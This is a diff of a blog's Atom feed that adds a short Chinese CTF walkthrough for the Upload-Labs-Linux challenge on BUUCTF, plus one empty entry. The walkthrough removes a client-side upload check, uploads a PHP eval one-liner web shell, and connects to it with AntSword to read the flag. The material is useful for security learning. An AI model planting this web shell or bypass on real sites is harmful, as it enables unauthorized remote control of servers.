@@ -8,7 +8,40 @@
     <author>
       <name>maxshiroi</name>
     </author>
-    <updated>2022-09-23T07:53:04.734Z</updated>
+    <updated>2022-10-10T00:52:48.000Z</updated>
+    <entry>
+        <id>http://maxshiroi.top/ug/085248/</id>
+        <title>Upload-Labs-Linux</title>
+        <link rel="alternate" href="http://maxshiroi.top/ug/085248/"/>
+        <content type="html">&lt;h1 id=&#34;题目预览&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#题目预览&#34;&gt;#&lt;/a&gt; 题目预览：&lt;/h1&gt;
+&lt;p&gt;&lt;img data-src=&#34;/img/Upload-Labs-Linux/20221010085420.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h1 id=&#34;解决方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#解决方法&#34;&gt;#&lt;/a&gt; 解决方法&lt;/h1&gt;
+&lt;ol&gt;
+&lt;li&gt;开控制台&lt;/li&gt;
+&lt;li&gt;关闭 javascript
+&lt;blockquote&gt;
+&lt;p&gt;设置 - 偏好设置 - 调试程序&lt;br /&gt;
+删除 &lt;code&gt;onsubmit=&amp;quot;return.checkFile()&amp;quot;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/li&gt;
+&lt;li&gt;新建一个文件里面写入 &lt;code&gt;&amp;lt;?php @eval($_POST[&#39;123&#39;]);?&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;后缀名改为 php 上传到网站，显示出图片后右键复制链接。&lt;/li&gt;
+&lt;li&gt;打开 antsword，add 一个 url 地址为图片链接，密码为 123，加密 base64.&lt;/li&gt;
+&lt;li&gt;点击链接就能发现根目录有个 flag 文件了。&lt;/li&gt;
+&lt;/ol&gt;
+</content>
+        <category term="ctf" scheme="http://maxshiroi.top/tags/ctf/" />
+        <category term="buuctf" scheme="http://maxshiroi.top/tags/buuctf/" />
+        <category term="antsword" scheme="http://maxshiroi.top/tags/antsword/" />
+        <updated>2022-10-10T00:52:48.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://maxshiroi.top/ug/082833/</id>
+        <title>linuxlearn2</title>
+        <link rel="alternate" href="http://maxshiroi.top/ug/082833/"/>
+        <content type="html"></content>
+        <updated>2022-09-27T00:28:33.000Z</updated>
+    </entry>
     <entry>
         <id>http://maxshiroi.top/ug/155304/</id>
         <title>Hello World</title>
